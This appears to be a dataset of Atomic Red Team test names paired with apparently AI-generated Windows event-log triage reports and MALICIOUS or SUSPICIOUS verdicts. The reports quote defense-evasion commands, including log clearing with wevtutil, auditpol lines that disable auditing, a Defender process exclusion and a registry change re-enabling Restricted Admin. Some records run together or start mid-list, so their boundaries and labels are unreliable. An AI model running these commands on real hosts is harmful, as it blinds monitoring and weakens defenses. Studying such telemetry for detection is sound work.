   - **Sysmon and System Logs**: Show the creation and manipulation of a suspicious Windows service, named `AtomicService`, with its `binPath` set to `C:\Windows\System32\calc.exe`. While `calc.exe` itself is a legitimate application, using it as a service executable can be a method to establish persistence or execute malicious payloads under the guise of a legitimate process.
   - The command line used to create the service indicates an attempt to set detailed service permissions, which further elevates suspicion.

5. **Execution of System Utilities:**
   - **Sysmon Logs**: Records several executions of `wevtutil.exe`, which is known for managing event logs. Specifically, it shows commands to clear various log channels, including Application, System, and Security logs. Coupled with the actual clearing events found, this behavior underscores attempts to remove tracks of potentially malicious activities.

6. **High Integrity Processes:**
   - The processes like `cmd.exe` creating services and utilities like `wevtutil.exe` were executed under high integrity, suggesting the operations were performed with elevated privileges, aligning with potential unauthorized administrative access.

### Final Assessment:
Considering the series of events, particularly the clearing of event logs, time manipulation, and unauthorized service creation, there are strong indicators of malicious activity with attempts to conceal these actions. The behavior fits the pattern typically associated with a compromise involving privilege escalation and log tampering intended to obscure malicious infiltration and persistence.

### Final Resolution:
- **MALICIOUS**: The logs provide clear evidence of malicious activity. Immediate steps should be taken to contain and mitigate the impact, including disconnecting the affected machine from the network, preserving logs and other volatile data for further forensic examination, and conducting a thorough security review to determine the scope and source of the breach.

Enabling Restricted Admin Mode via Command_Prompt,"### Detailed Analysis:

Upon reviewing the provided logs, several indicators of potentially malicious activities emerge. Here are the key findings:

1. **Log Clearing Events**:
   - In the Security logs, Event ID 1102 indicates that the event log was cleared by `admin_test`. This is a significant red flag as attackers often clear logs post-compromise to eliminate traces of their activity.
   - In the System logs, multiple Event ID 104 are observed, indicating the clearing of system logs across different channels (System, Windows PowerShell) also by the same user, `admin_test`. Log clearing without a legitimate reason or outside regular maintenance activities can suggest an attempt to cover illicit activities.

2. **Time Change Events**:
   - Security Event ID 4616 indicates a change in system time by the `LOCAL SERVICE`, which aligns with Kernel-General events in the System log (Event ID 1) showing time adjustments. This may be an attempt to manipulate time-dependent security protocols.

3. **Command Execution and Privilege Level**:
   - The Sysmon logs reveal several executions of `wevtutil.exe` for clearing event logs which are not typical and conducted at a high integrity level. This gives weight to the hypothesis of obstruction by a malicious actor.
   - The suspicious command line `cmd.exe /c reg add ""hklm\\system\\currentcontrolset\\control\\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0` seen executed by `admin_test` is indicative of unauthorized modification of sensitive registry settings which can potentially weaken the security posture, allowing for more covert operations or privilege escalation.

4. **Recurrent Mention of `admin_test` User**:
   - The frequent use of the `admin_test` account in several events indexed to potentially compromising activities suggests that this account might be compromised. 

5. **Process Spawning**:
   - A review of process creation events shows the spawning of `cmd.exe`, `reg.exe`, and other Command Line Utility tools by `wevtutil.exe`, aligning with malicious event log tampering.

6. **Standard Edge Update Activity**:
   - The presence of Microsoft Edge Update and associated executables indicates regular update processes, which typically should not be cause for concern in terms of malicious activity.

### Assessment and Conclusion:

Based on the identified activities, there are strong indicators suggesting malicious behavior:
- Unusual log clearing events by `admin_test`.
- Attempts to modify registry entries related to admin access.
- Changes in system time potentially aimed at altering logs or timestamps.

**Resolution**: **MALICIOUS**

Rundll32 with Control_RunDLL,"### Detailed Analysis

The logs indicate a sequence of events on the host machine ""Server002"" which suggest potential malicious activity:

1. **Suspicious Use of wevtutil.exe**: The command-line utility `wevtutil.exe`, which is used to manage event logs, was executed multiple times by the user ""SERVER002\\admin_test"". These executions were quickly followed by clearing of event logs (Event ID 1102 in the Security log and Event ID 104 in the System log). This behavior is indicative of an attempt to cover tracks, which is a common tactic used in malicious activities to hinder forensic investigations.

2. **Execution of Malicious DLL via rundll32.exe**: A suspicious instance of `cmd.exe` executed `rundll32.exe` with a DLL from the Temp directory (""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1047\\bin\\calc.dll""). Usage of `rundll32.exe` to load a DLL is often used in lateral movement or payload execution by attackers. The DLL being run from a temp directory is particularly concerning, as it suggests a drop of potentially malicious code.

3. **Clearing of Event Logs**: The user ""admin_test"" cleared logs from different channels multiple times, which includes both Security and System logs. Clearing event logs is a significant activity that is commonly associated with attempts to evade detection.

4. **Run of Administrator Commands**: Commands like `whoami.exe` and `hostname.exe` alongside PowerShell and wevtutil suggest enumeration activities, which are typically associated with reconnaissance phases of an attack.

5. **Integrity Level**: Many of these suspicious events were executed with a high integrity level, signifying that they were run with elevated privileges, which increases the potential impact of this activity.

6. **Edge Update Activity**: There were a series of `MicrosoftEdgeUpdate.exe` activities that appear benign at first glance but should be cross-checked for consistency with known scheduled update tasks or user behavior, as similar processes can be impersonated or abused during attacks.

### Assessment
The combination of event log clearing, suspicious DLL execution, and administrative command executions raises several red flags. Such actions are often indicative of an intruder attempting to maintain persistence, escalate privileges, and cover their actions.

### Resolution: MALICIOUS
The logs contain evidence of actions which align with tactics, techniques, and procedures (TTPs) typically associated with malicious activity, specifically indicative of potential post-exploitation behavior and attempts to obfuscate or hide these actions.

### Recommended Actions
1. **Isolate the Affected Host**: Immediately isolate the affected server, Server002, from the network to prevent further malicious activity and potential spread to other systems.

2. **Conduct a Full Host Investigation**: Use existing forensic images to perform a comprehensive forensic investigation to determine the full scope of the compromise.

3. **Review User Activity**: Investigate the user ""admin_test"" to understand if this is a legitimate administrative account that has been compromised or if it is being used by an insider.

4. **Review Recent Permission Changes and High Integrity Activities**: Investigate any recent privilege changes or other high-integrity operations on the system performed by the user.

5. **Disable Potentially Malicious or Unused Accounts**: Remove or disable accounts that may have been used by the attacker.

Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,"After reviewing the provided logs, several indicators of potentially malicious activity stand out:

1. **Event Log Clearing:**
   - The system, PowerShell, and security event logs were cleared by the user `admin_test`. Events with IDs 104 (System and PowerShell logs) and 1102 (Security log) indicate that these logs were manually cleared. This action is often associated with attempts to cover tracks after executing potentially malicious activities.

2. **Suspicious PowerShell Activity:**
   - Multiple PowerShell events with EventID 600 indicate a command executed to set registry keys related to Internet settings (`http` and `https` protocols) to 0 using `Set-ItemProperty`. Modifying these registry settings without a valid justification can be an indicator of an attempt to bypass security settings or manage browser behavior for malicious purposes.

3. **Use of `wevtutil` Command:**
   - The `wevtutil` command-line utility was used to clear logs, as seen in the Sysmon logs, confirming the log clearing activities. This tool is commonly used for this purpose, which could be part of a tactic to hinder incident response efforts.

4. **Use of System Utility Tools:**
   - Process executions like `whoami.exe`, `hostname.exe`, and `cmd.exe` were observed. While this can be typical behavior, when aligned with log clearing and registry changes via PowerShell, it can indicate reconnaissance or enumeration activity by an unauthorized user.

5. **Microsoft Edge Update:**
   - There are events related to Microsoft Edge Update. While frequent updates are not unusual for software, context provided earlier suggests edgeupdate service stopping. If this is combined with log clearing, it might be related to persistence mechanisms or tools used during unauthorized access.

Due to the combination of these observations, particularly the log clearing and unauthorized PowerShell script execution, the resolution for this investigation is:

**Resolution: SUSPICIOUS**

**Guidance:** 
- Further investigation is warranted. Conduct a detailed review of the affected system:
  - Verify any recent administrative actions from legitimate users that might explain the log clearing.
  - Inspect the timeline of PowerShell script execution and registry changes.
  - Utilize endpoint detection and response (EDR) tools to detect any additional anomalous processes or network-related activities.
  - Comprehensively analyze user account activities, focusing specifically on `admin_test` to validate the legitimacy of actions taken.
  - Consider implementing increased monitoring, additional log management policies, and a potential incident response plan if further malicious evidence is uncovered."
Disable Windows Lock Workstation Feature,"In examining the provided Windows event logs, several items raise concerns regarding potential malicious activity. Here's a detailed analysis based on the logs:

1. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` utility was used multiple times to clear event logs, specifically targeting logs such as Microsoft-Windows-Sysmon/Operational, Application, System, and Windows PowerShell. This activity is suspicious as it suggests an attempt to cover tracks by clearing evidence of past actions. This is commonly seen in post-exploitation scenarios where an attacker tries to remove forensic evidence.

2. **Registry Modification via `cmd.exe`:**
   - The execution of `cmd.exe` with a command to modify the registry (`DisableLockWorkstation`) is suspicious. Such modifications can be indicative of an attacker attempting to maintain persistence or disable security features on the system.

3. **Process Execution Pattern:**
   - There is a pattern of process executions where legitimate system utilities (`wevtutil.exe`, `cmd.exe`, `reg.exe`, and `whoami.exe`) are executed in succession. While the use of these utilities alone is not inherently suspicious, the context in which they are used (clearing logs and modifying system settings) adds to the possible malicious intent.

4. **Event Log Clearing:**
   - Security event log ID 1102 indicates the security log was cleared by `admin_test`. Similarly, system log events with ID 104 indicate that both System and Windows PowerShell logs were cleared. Log clearing is a notable sign of suspicious activity, as it indicates someone might be trying to hide their tracks.

5. **Privilege Level:**
   - All actions are being executed under high integrity levels, suggesting that the account has administrative privileges. The account `SERVER002\\admin_test` is involved in clearing logs and is related to other suspicious activities, suggesting possible abuse of legitimate admin privileges.

6. **Suspicious Parentage:**
   - Many processes are spawned from `wsmprovhost.exe` with the `-Embedding` parameter, which is an expected behavior for Windows Management tasks but suspicious when seen with operations like clearing logs consecutively.

7. **Edge Update Processes:**
   - A number of processes related to Microsoft Edge Update are evident, but these seem to follow a normal pattern of activity for software updating. These can potentially be ignored unless further intelligence suggests otherwise.

**Assessment & Resolution:**
Based on the above findings, there are clear indicators of suspicious activity, primarily focusing on the clearing of event logs and tampering with the system registry to potentially disable security features. The convergence of these activities suggests an attempt to hide tracks, which is characteristic of malicious activity. I recommend investigating the `admin_test` account and checking for any unauthorized access or anomalies associated with this account.

**Recommended Resolution: MALICIOUS**

1. **Log Clearing Activity**: 
   - Security log event ID 1102 indicates that the security log was cleared by the user `admin_test`. This action is highly suspicious as it may indicate an attempt to hide malicious activities. Similar actions are seen in the system and Windows PowerShell logs, where logs have been cleared by `admin_test`.
   
2. **Use of `wevtutil`**:
   - Multiple instances of `wevtutil.exe`, which is used to clear event logs, were observed in the Sysmon logs executed by `admin_test`. This further supports the suspicion around log tampering. The command `wevtutil cl Security` is specifically used for clearing the Security event log.
   
3. **Unusual PowerShell Activity**:
   - There is an execution of PowerShell (PID 4272) with the user `admin_test`. While specifics of the commands run in PowerShell are not shown, the timely proximity to log clearing raises concerns, demanding further inspection of what these scripts might have executed if possible.

4. **Unusual Use of CMD and Compilation Events**:
   - There are activities related to `cmd.exe` (PID 5664) executing with parameters related to the .NET Framework compiler (`csc.exe`) from a temp directory and subsequently using `regasm.exe`. This is unusual and potentially indicates a DLL planting or code compilation for persistence or privilege escalation.

5. **Atomic Red Team Artifact**:
   - The command line mentions `AtomicRedTeam\T1218.009\src\T1218.009.cs`, which suggests the use of a known adversary simulation tool. While potentially for legitimate security testing, if not properly documented, this is suspicious.

6. **Continuous Edge Update Executions**:
   - Multiple instances and updates of Microsoft Edge are observed. While this may be a repetitive update task, in the context of cleared logs and usage of temp locations, it necessitates verifying legitimate update activities.

**Assessment and Guidance**:
- The logs reflect several indicators of potentially nefarious activity: log clearing, unmonitored scripting, and execution of suspicious commands.
- Based on these findings, this activity is labeled as **SUSPICIOUS**.
- Immediate steps should include:
  - Investigating the `admin_test` user's actions and any unusual access patterns or privileges.
  - Reviewing the purpose and scope of the Atomic Red Team execution.

   - The logs show multiple instances of log files being cleared (EventID: 1102 from the Security log and EventID: 104 from the System log). These events are performed by the user ""admin_test"" who has a high integrity level.
   - The process responsible for clearing these logs is `wevtutil.exe`, which is a legitimate tool for managing Windows Event Logs but can be abused to cover tracks after malicious activities.

2. **Time Manipulation Events**:
   - Events with ID 4616 indicate that the system time was set back. This can be an attempt to circumvent logging mechanisms or mismatches in event timestamps as part of sophisticated attacks to evade detection.

3. **Registry Modification**:
   - A suspicious command executed via `cmd.exe` was logged in the Sysmon logs, modifying the registry to add a value under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System` to disable the Task Manager (`DisableTaskmgr`). This could prevent users from terminating malicious processes.

4. **Process Activity**:
   - We notice several process creations linked to system utilities showing a pattern that resembles privilege escalation or defense evasion techniques. It involves `wevtutil.exe` and registry modification using `cmd.exe` and `reg.exe`, supporting the hypothesis of an attempt to bypass security controls.

5. **Software Updates**:
   - There are normal-looking updates to Microsoft's Edge via the `MicrosoftEdgeUpdate.exe`, though they occur amidst the potentially malicious activities. However, it must be ensured these updates are legitimate as attackers could disguise malware as software updates.

### Assessment and Findings:
- The observed clearing of event logs, time manipulation, disabling of Task Manager, and suspicious command executions strongly suggest the presence of malicious activity.
- Given the combination of these factors, it appears likely that these are not isolated benign activities but part of a coordinated attempt at unauthorized system manipulation, potentially indicating compromised activity.

Register Portable Virtualbox,"Upon reviewing the provided Windows event logs, I have observed several entries that suggest suspicious behavior and potential indicators of compromise. Below is a detailed analysis of notable events:

1. **Clearing Event Logs:**
   - Event ID 1102 in the Security log and Event ID 104 in the System log indicate that logs for these channels were cleared by a user with the SID S-1-5-21-3962163828-2803415714-1403596700-1006, which corresponds to the user ""admin_test"" on SERVER002.
   - Clearing logs is a significant red flag as it is commonly associated with attempts to cover tracks following illicit activity.

2. **Wevtutil.exe Commands:**
   - Multiple entries for the execution of `wevtutil.exe` to clear logs (""cl"" command) in different contexts, including ""Microsoft-Windows-Sysmon/Operational"", ""Application"", and others. This could be indicative of an attempt to manipulate or hide event logs.

3. **Unusual PowerShell Activity:**
   - A PowerShell event indicating the execution of a script that involves downloading a file from a GitHub repository related to Atomic Red Team with the command `Invoke-WebRequest`. Atomic Red Team scripts are typically used for security testing, but if not authorized, this action could denote malicious reconnaissance or testing activity.

4. **Command Execution Likely Involving Privilege Escalation:**
   - The use of `cmd.exe` for orchestrating complex commands involving `VBoxSVC.exe`, `regsvr32`, and other system utilities can be a sign of an attacker attempting to gain persistence or execution capabilities. The command suggests the creation of a service ""VBoxDRV,"" often related to virtualization software, but if unauthorized, might be suspicious.

5. **Scheduled Task or Malicious Utility:**
   - Observations of `RUXIMICS.exe` and `PLUGScheduler.exe` running under NT AUTHORITY\SYSTEM without clear context, which may denote the presence of scheduled tasks, potentially used for malicious purposes.

Based on the nature of these activities, especially the clearing of event logs and other changes indicative of potential unauthorized system modifications, I conclude that the logs contain signs of suspicious activity warranting further investigation.

**Resolution: SUSPICIOUS**

**Guidance on how to proceed:**
- Confirm with the involved user (""admin_test"") whether these actions were legitimate and authorized.
- Conduct a security audit on SERVER002 to look for signs of compromise, specifically focusing on any newly installed services or scheduled tasks.
- Examine network logs to identify any external communication correlating with the timestamps of suspicious activities.
- If unauthorized activity is confirmed, escalate the issue for potential incident response actions to contain and remediate the threat."
Impair Windows Audit Log Policy,"The analyzed logs reveal several suspicious activities that might indicate potential malicious behavior:

1. **Clearing of Event Logs**:
   - Application (`wevtutil cl`) and system logs were cleared by the user `SERVER002\admin_test` using the `wevtutil` command-line tool. This is evidenced by the Sysmon logs showing execution of `wevtutil.exe` with high integrity level and matching hash values for multiple log channels (Sysmon, Application, Security, System, and Windows PowerShell).
   - Event IDs 104 in the System log and 1102 in the Security log confirm the clearing of these logs. The clearing of event logs is a common tactic used by attackers to cover their tracks, indicative of malicious intent or post-compromise cleanup.

2. **Suspicious Audit Policy Changes**:
   - The logs contain multiple instances of the audit policy being altered (Event ID 4719 in Security logs). These changes were executed by `SERVER002\admin_test` and involve disabling auditing categories like ""Account Logon"", ""Logon/Logoff"", and ""Detailed Tracking"". Disabling auditing is another tactic used to prevent detection of malicious activities.
   
3. **Commands Run from Command Line**:
   - A command involving `auditpol.exe` was executed to disable auditing: `auditpol /set /category:""Account Logon"" /success:disable /failure:disable`, among others. This aligns with the audit policy changes found in the Security logs and is an explicit attempt to suppress event logging related to authentication.

4. **Multiple Instances of `conhost.exe` and `cmd.exe`**:
   - Numerous instances of `conhost.exe` and several instances of `cmd.exe` are observed running as child processes to suspicious command-line operations. While these are typical components of Windows processes, their invocation as part of the log-clearing operations by `admin_test` is noteworthy.

5. **Time Change**:
   - There are system and security Event IDs (ID 4616 in Security) indicating a change in the system time executed by `LOCAL SERVICE`. This is an unusual event that can be indicative of attempts to manipulate system logs or cause confusion.

Given these observations, the following clear indicators point towards malicious activity:

- Use of `wevtutil` to clear event logs which align with covered tracks behavior.
- Disabling of auditing through `auditpol`, which suggests disabled logging of critical security events.
- Execution of terminal and command line programs coupled with cleaning actions and security compromising activities.

**Assessment**:
The combination of event log tampering, audit policy alteration, and potentially obscured timeline (time change events) is a classic tactic to hide malicious activity on a Windows system and suggests an attempted cover-up of unauthorized access or system changes by the user `SERVER002\admin_test`.

**Recommendation**:
- Immediate isolation of the affected system `Server002` should be considered to prevent potential leakage or further compromise.
- Conduct a thorough forensic investigation to determine the full scope of the compromise.
- Review and reinforce security policies, particularly around audit logging and administrative access.

**Resolution**:
**MALICIOUS** - The logs contain definitive malicious activity which points towards a compromise aimed at covering tracks and suppressing security audits."
Delete an entire folder - Windows cmd,"Upon analyzing the provided Windows event logs, several entries stand out as suspicious and potentially indicative of malicious activities. Below is a detailed assessment of these activities:

### Log Analysis:

1. **Clearing Event Logs**: 
   - **System Log Event ID 104 and Security Log Event ID 1102**: 
     - The logs show multiple instances of event log clearing by the user ""SERVER002\admin_test"". Specifically, the System, Security, and Windows PowerShell logs were cleared within a very short time frame.
     - Log clearing is a common tactic used by malicious actors to cover their tracks and make forensic investigation difficult.

2. **Unusual Command Line Executions**:
   - **Sysmon Log Event ID 1**: 
     - The user ""SERVER002\admin_test"" executed multiple instances of `cmd.exe` with commands related to checking for the existence of a file (`IF EXIST`) and later commands to create and delete directories (e.g., `mkdir` and `rmdir`) in a specific temp directory. 

3. **Execution of `wevtutil`**:
   - **Sysmon Log Event ID 1**: 
     - There are repeated executions of `wevtutil.exe` with the `cl` (clear logs) command, targeting multiple logs (e.g., Microsoft-Windows-Sysmon/Operational, Application, System, and Security logs). This further supports the hypothesis of log tampering and is a potential indicator of malicious intent.

4. **High Integrity Level Commands**:
   - Processes such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe` were executed under a high integrity level, suggesting the use of elevated privileges consistent with an attempt to perform unauthorized or elevated actions.

### Assessment:
The observed behaviors in the logs, particularly the clearing of event logs, repeated execution of command-line instructions that involve log management, and high integrity executions linked to `admin_test`, strongly suggest attempts to tamper with the system and perform potentially malicious activities. The rapid succession of these activities further increases the likelihood of malicious intent.

### Recommendation:
1. **Resolution**: **MALICIOUS**
    - The logs present clear indicators of compromise due to the log clearing activities and the execution of potentially harmful command-line operations.

2. **Immediate Actions**:
   - Implement measures to isolate the affected system (Server002) from the network to prevent further potential malicious activities.
   - Conduct a comprehensive forensic analysis to determine the full scope of the incident.
   - Review and strengthen access control policies and ensure that logging integrity is maintained with immutable logs.
   - Initiate a thorough review of user activities, particularly focusing on the account ""SERVER002\admin_test"", to ensure there were no unauthorized changes or data access.

3. **Long-term Strategy**:
   - Consider implementing solutions that detect and alert on log tampering and other potential indicators of compromise.
   - Train personnel on recognizing early signs of a security breach.
   - Regularly audit critical accounts and enhance documentation on incident handling procedures."
Lolbin Jsc.exe compile javascript to dll,"Upon analyzing the provided event logs, several indicators suggest potential malicious activity that merits a deeper investigation. Here's a breakdown:

### Suspicious Activities:
1. **Event Log Clearing:**
   - In the `System log`, `Security log`, and `Windows PowerShell log` entries, we observe multiple `EventID: 104` and `EventID: 1102` events indicating that the event logs for the System, Security, and PowerShell have been cleared by `admin_test`. Log clearing is often a deliberate action taken by an attacker to cover their tracks.
   - We also see process activities from the `wevtutil.exe` process, which is used for event log manipulation (`EventID: 1` and `5` in the Sysmon log).

2. **Privileged Command Execution:**
   - The execution of `wevtutil.exe` command (`EventID: 1`) in Sysmon indicates direct command-line interactions to clear logs. This included actions are taken by `SERVER002\admin_test` with high-integrity levels.
   - The `cmd.exe` process executed a command involving the `jsc.exe` tool (`EventID: 1` in Sysmon) which compiles JavaScript into .NET assemblies. The use of `AtomicRedTeam` and the explicit command line suggests potential execution of known adversary simulation tools or scripts, which can be utilized for testing or emulating attacker techniques but can also be leveraged maliciously.

3. **Unusual Network Service Activity:**
   - A significant number of services like `wbem\WmiPrvSE.exe`, `MusNotification.exe`, `CompatTelRunner.exe`, `SecurityHealthService.exe`, and others are executed in the `Sysmon log` entries around the same time as events indicating log clearance. While not inherently malicious, the correlation with the log clearance activity raises concerns.

4. **Use of `whoami.exe`, `hostname.exe`, and `svcutil.exe`:**
   - The execution of `whoami.exe` and `hostname.exe` (`EventID: 1` in Sysmon) suggests reconnaissance activities that might be checking the current user context and system information, typical steps taken in lateral movement or privilege escalation routines.
   
5. **Security Group Enumeration:**
   - Events with `EventID: 4798` in the `Security log` indicate enumeration of security group memberships for several built-in and user accounts, possibly to understand privileges and roles within the network environment.

### Assessment:

The correlation of log clearing activities, high-integrity level executions, the presence of known adversary simulation tool activities, and group enumeration strongly suggests an attempt to evade detection and extract information potentially for a lateral movement or privilege escalation phase.

### Resolution: **MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Disconnect the affected host from the network to prevent further potential lateral movement.
   - Perform user access reviews, especially focusing on `admin_test` and any accounts displaying anomalous activities.

2. **Forensic Analysis:**
   - Conduct a comprehensive forensic analysis of the system disk and memory to identify any additional artifacts related to potential compromise.
   - Review other systems and logs for similar activities or linked suspicious behaviors.

3. **Review Security Policies:**
   - Ensure logging settings and retention policies are reviewed and hardened to ensure log manipulations are more challenging in the future.
   - Evaluate EDR alert configurations to ensure earlier detection of similar behaviors.

4. **User Awareness & Training:**
   - Run an awareness program for users on recognizing and reporting phishing attempts, as initial access could have been facilitated by such vectors. 

Considering these actions will help mitigate current threats and prevent future incidents."
Windows Auto Update Option to Notify before download,"The logs provided indicate several activities that point to suspicious and potentially malicious behavior:

1. **Log Clearing Events**:
   - The event ID 1102 from the Security log indicates that the security log was cleared by the user `admin_test`. This is a significant red flag as it is typically an attempt to hide tracks after unauthorized or malicious activity.

2. **Unauthorized Access and Privilege Escalation**:
   - Multiple instances of `wevtutil.exe` being used to clear events from other logs (Sysmon, Application, System, and Windows PowerShell) suggest attempts to remove traces of particular actions, as seen in Event IDs: 104 from System logs.
   - Event ID 4672 logs show the use of highly sensitive privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege) which are typically reserved for system-level operations and should not be frequently used unless necessary.

3. **Suspicious Command Execution**:
   - The `cmd.exe` process with a command line intention to modify Windows Update settings (`reg  add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" ...`) suggests potential administrative control over system updates, which may be considered suspicious without proper context.
   - Additional Sysmon entries show `whoami.exe` and `hostname.exe` running, which may be used to gather information about system configuration and current user context — activities often associated with reconnaissance.

4. **Time Manipulation**:
   - There are logged instances of time adjustment (Kernel-General Event ID 1 and 24) which can be used to mislead the timeline of events, potentially to confuse log analysis.

Based on these observations, this collective set of actions strongly suggests unauthorized activity aimed at manipulating system records, gaining unauthorized elevated privileges, and hiding such activities through log clearance and potentially modifying time settings.

**Resolution**: MALICIOUS

**Guidance**:
- Immediate isolation of the affected system to prevent further spread of any potential compromise.
- Perform a comprehensive forensic investigation to determine the scope and scale of any data breach or impact.
- Review and enhance security policies around user privileges, especially for high-level accounts.
- Implement stricter monitoring and alerting for log clearance events and privilege escalation attempts."
Tamper with Windows Defender Evade Scanning -Process,"Upon analysis of the provided event logs from the Windows host, several indications of potentially malicious activity are present. Below is a detailed assessment of the logs:

### Detailed Analysis:

1. **Clearing of Event Logs:**
   - Multiple occurrences of the event logs being cleared are recorded for the System, Windows PowerShell, and Security event logs:
     - **Event ID 104 (System log):** Indicates that the system log was cleared.
     - **Event ID 1102 (Security log):** Indicates that the security log was cleared.
   - The clearing of these logs was performed by a user account ""admin_test"", which is a key indicator of an attempt to cover tracks after performing potentially malicious activities.

2. **Suspicious Process Activity:**
   - Multiple instances of the `wevtutil.exe` command were used to clear event logs, specifically targeting key system logs like Security and Windows PowerShell logs.
   - The Sysmon logs capture extensive use of `wevtutil.exe` with commands specifically clearing logs: `cl System`, `cl Application`, `cl Security`, and `cl ""Windows PowerShell""`.
   - These commands are not part of regular system maintenance tasks and suggest an attempt to remove traces of actions performed using this account.

3. **Privileged Command Execution:**
   - A PowerShell command was executed with the intent to manipulate Windows Defender settings:
     - `Add-MpPreference -ExclusionProcess $excludedProcess` with ""outlook.exe"" as the excluded process.
   - Modifying Windows Defender settings to exclude specific processes may indicate an attempt to allow malicious software or actions to run undetected.

4. **Overall Timing and Sequence:**
   - The events related to clearing logs and executing potentially harmful commands all occurred in quick succession.
   - This timing pattern is consistent with the behavior of a threat actor who is attempting to quickly perform actions and then eliminate any trace.

### Assessment:

Based on the analysis of the provided logs, there are multiple indicators of potential compromise and malicious activity. The primary concerns are the clearing of multiple event logs by a user account, which is a common tactic used to obfuscate malicious actions, and the suspicious modification of Windows Defender settings via PowerShell.

### Resolution:

**MALICIOUS**

### Recommendations:

1. **Immediate Action:**
   - Isolate the affected machine (Server002) from the network to prevent further potential damage or spread of malicious actions.
   - Conduct a detailed forensic analysis of the machine to identify any additional indicators of compromise and assess the full extent of the intrusion.

2. **Review and Mitigation:**
   - Review user account privileges and ensure ""admin_test"" and similar accounts have appropriate permissions.
   - Implement enhanced monitoring, especially for administrative actions like log clearing and PowerShell commands.
   - Use security tools that can detect and alert on suspicious activity such as log clearing or the execution of unauthorized commands.

3. **Post-incident Analysis:**
   - Conduct a broader security assessment to determine if similar activities have occurred on other systems in the organization.
   - Update incident response plans and procedures to ensure readiness against similar threats in the future."
Indirect Command Execution - Scriptrunner.exe,"Analyzing the provided logs, there are several points of interest that warrant further scrutiny:

1. **Wevtutil.exe Activity**: 
   - Wevtutil.exe is a legitimate tool used for managing and querying event logs in Windows. However, its extensive use within this timeframe is unusual and typically associated with attempts to clear or modify event logs, potentially indicative of malicious activity. In this case, we see multiple instances of `wevtutil.exe` being run with the ""clear log"" command (`cl`) over various event channels (System, Application, Security, Windows PowerShell).

2. **Log Clearing Events**:
   - The Sysmon logs (EventID 5) corroborate the execution of `wevtutil.exe` for clearing logs by `admin_test`. Furthermore, these activities are followed by Event ID 1102 in the Security logs, indicating the security audit log was cleared. Such behavior is often seen in attempts to cover tracks after potentially unauthorized activities.

3. **PowerShell Activity**:
   - There are entries indicating the use of PowerShell from the Windows PowerShell logs. The command line contains `Scriptrunner.exe`, which invokes an appv-script to execute `calc.exe`. While `calc.exe` is a benign application, utilizing PowerShell to execute it could be indicative of testing or staging for scripts that may be substituted with malicious code later.

4. **Kernel and Time Synchronization Events**:
   - The kernel-general and time sync events (adjustments of windows time) might not be directly suspicious but can indicate attempts to disrupt or manipulate time stamps, potentially as part of an effort to obscure log activity timing.

5. **System and Application Events**:
   - Multiple `Microsoft-Windows-Eventlog` events in the System logs directly indicate logs being cleared around the same timestamps observed for `wevtutil.exe` executions.

Given these details, the following assessment is made:

- **Assessment**: The actions observed in the logs, especially the use of `wevtutil.exe` to clear various event logs and the PowerShell execution sequences, are suspicious activities. While they do not provide definitive evidence of malicious activity, the behaviors indicate potential attempts to hide activity, which often aligns with compromise techniques. 
- **Threat/Risk**: These activities could represent an unauthorized attempt by someone with access to obscure their actions within the system. Potential risks include unauthorized data access, exfiltration, or further malicious activities masked by the cleared logs.
- **Guidance**: An in-depth investigation is needed to confirm whether these activities are legitimate maintenance scripts authorized by the IT department or potential compromises. 
   - Immediately alert relevant security teams to monitor for any further unauthorized activities.
   - Conduct a thorough inspection of recently accessed or modified files and user permissions.
   - Inspect network logs for any suspicious outbound connections correlating with the times of these events.
   - Validate scripts and task schedules that involve PowerShell or `wevtutil.exe` for authorized usage.

**Resolution**: **SUSPICIOUS** - further investigation warranted."
Creating W32Time similar named service using schtasks,"After analyzing the provided event logs, there are several key observations that point to possible malicious activity, warranting further investigation:

### Key Observations and Analysis:

1. **Clearing of Event Logs:**
    - Multiple entries indicate the use of the `wevtutil.exe` utility to clear various event logs:
        - Sysmon, Application, System, Security, and Windows PowerShell logs were cleared.
        - These actions were performed by the user `SERVER002\admin_test` using the `wevtutil.exe` command.
    - EventID 104 in the System log and EventID 1102 in the Security log confirm these logs were cleared.
    - The clearing of logs, especially without apparent legitimate justification, is a strong indicator of attempts to cover tracks and is considered indicative of malicious activity.

2. **Scheduled Task Creation:**
    - A scheduled task `win32times` was created using a command sequence involving `cmd.exe`, and `powershell.exe`, with a PowerShell script executed using bypass execution policy.
    - The use of `schtasks.exe` with PowerShell and the `-ep bypass` argument is often used to evade detection.
    - The task was set to run daily under the SYSTEM account, increasing the severity of potential impact.

3. **Processes and Command Line Usage:**
    - Commands from the Sysmon logs show the use of `hostname.exe` and `whoami.exe`, potentially indicating recon activities.
    - The presence of a non-existent PowerShell script (`c:\\T1036.004_NonExistingScript.ps1`) should be verified; it could be a misstep or a way to silently fail an intended operation.

4. **Defensive Evasion Patterns:**
    - The clearing of logs through `wevtutil.exe` is a deliberate action taken to erase traces, which aligns with typical behavior seen in post-exploitation phases.
    - The intentional scheduling of tasks that execute scripts under system privileges further implements a persistence mechanism.

5. **Context and Behavior Justification:**
    - While some automated or administrative tasks might use such utilities, the timing, combination, and user context suggest unauthorized activity aimed at maintaining undetected control.

### Conclusion and Recommendations:

- **Resolution: MALICIOUS**

Execute base64-encoded PowerShell,"**Analysis of the Logs**

Upon examining the provided Windows logs, I have identified several potentially concerning activities:

1. **Frequent Clearing of Event Logs**: 
   - Event Log ID 104 in the System log at ""11:39:47"" indicates that the System log was cleared by the ""admin_test"" user. 
   - Event Log ID 104 in the System log at ""11:39:49"" shows that the Windows PowerShell log was also cleared by the ""admin_test"" user.
   - Event Log ID 1102 in the Security log at ""11:39:48"" reports the Security log being cleared by the same user ""admin_test"".

   Clearing event logs, especially by an admin account, can be a sign of attempting to cover tracks of potentially malicious activities.

2. **Suspicious PowerShell Activity**:
